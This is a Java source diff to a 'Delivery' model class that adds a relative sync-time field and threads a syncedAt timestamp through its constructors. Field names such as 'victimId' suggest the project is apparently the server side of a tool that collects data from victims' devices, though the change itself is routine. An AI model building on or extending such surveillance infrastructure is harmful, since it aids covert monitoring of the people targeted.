@@ -1,5 +1,7 @@
 package com.theah64.xrob.api.models;
 
+import com.theah64.xrob.api.utils.clientpanel.TimeUtils;
+
 import javax.servlet.ServletContext;
 import java.io.File;
 
@@ -7,6 +9,11 @@ import java.io.File;
  * Created by theapache64 on 11/29/2015.
  */
 public class Delivery {
+
+    private  String relativeSyncTime;
+    public String getRelativeSyncTime() {
+        return relativeSyncTime;
+    }
 
     public static class DamagedPackageException extends RuntimeException {
         public DamagedPackageException(final String message) {
@@ -32,7 +39,7 @@ public class Delivery {
     private String serverErrorMessage;
 
 
-    private Delivery(String victimId, boolean hasError, String message, boolean hasServerError, String serverErrorMessage, String dataType, String id, String createdAt) throws Exception {
+    private Delivery(String victimId, boolean hasError, String message, boolean hasServerError, String serverErrorMessage, String dataType, String id, String createdAt, long syncedAt) throws Exception {
         this.id = id;
         this.victimId = victimId;
         this.dataType = dataType;
@@ -41,12 +48,15 @@ public class Delivery {
         this.hasServerError = hasServerError;
         this.serverErrorMessage = serverErrorMessage;
         this.createdAt = createdAt;
+        if (syncedAt != -1) {
+            this.relativeSyncTime = TimeUtils.getRelativeTime(syncedAt);
+        }
 
         checkDataType();
     }
 
-    public Delivery(String victimId, boolean hasError, String message, final String dataType) throws Exception {
-        this(victimId, hasError, message, false, null, dataType, null, null);
+    public Delivery(String victimId, boolean hasError, String message, final String dataType, long syncedAt) throws Exception {
+        this(victimId, hasError, message, false, null, dataType, null, null, syncedAt);
     }
 
     public void setDataType(String dataType) {
